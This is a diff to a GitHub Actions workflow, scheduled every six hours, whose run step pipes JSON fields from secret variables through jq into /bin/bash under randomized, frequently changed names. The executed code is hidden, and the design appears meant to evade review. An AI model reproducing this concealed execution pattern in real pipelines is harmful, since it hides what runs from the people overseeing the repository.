@@ -3,9 +3,9 @@ name: jixiaxingliang
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 2/6 * * *'
+    - cron: '4 2/6 * * *'
 
-jobs:  # 19493
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,14 +13,14 @@ jobs:  # 19493
       - uses: actions/checkout@v4
       - name: jixiaxingliang
         env:
-          qmtnw04246: ${{ secrets.qmtnw04246 }}
+          xnj55: ${{ secrets.xnj55 }}
         run: |
-          echo $qmtnw04246 | jq -r .twg19927 | /bin/bash
-          echo $dutz79154 | jq -r .mh03484 | /bin/bash
-          echo $tzqu56834 | jq -r .bl76624 | /bin/bash
-          echo $oob216 | jq -r .evkj858 | /bin/bash
-          echo $ee53502 | jq -r .j31888 | /bin/bash
-          echo $ta3067 | jq -r .jz88 | /bin/bash
-          echo $ohf485 | jq -r .wgz6 | /bin/bash
-          echo $mg65 | jq -r .y0 | /bin/bash
+          echo $xnj55 | jq -r .ur413 | /bin/bash
+          echo $g946 | jq -r .vv41002 | /bin/bash
+          echo $oxly076 | jq -r .uf64 | /bin/bash
+          echo $swo4038 | jq -r .h19815 | /bin/bash
+          echo $bz86823 | jq -r .npd8 | /bin/bash
+          echo $k2 | jq -r .lo855 | /bin/bash
+          echo $ey41459 | jq -r .hmn890 | /bin/bash
+          echo $idzj864 | jq -r .pttq13853 | /bin/bash
 
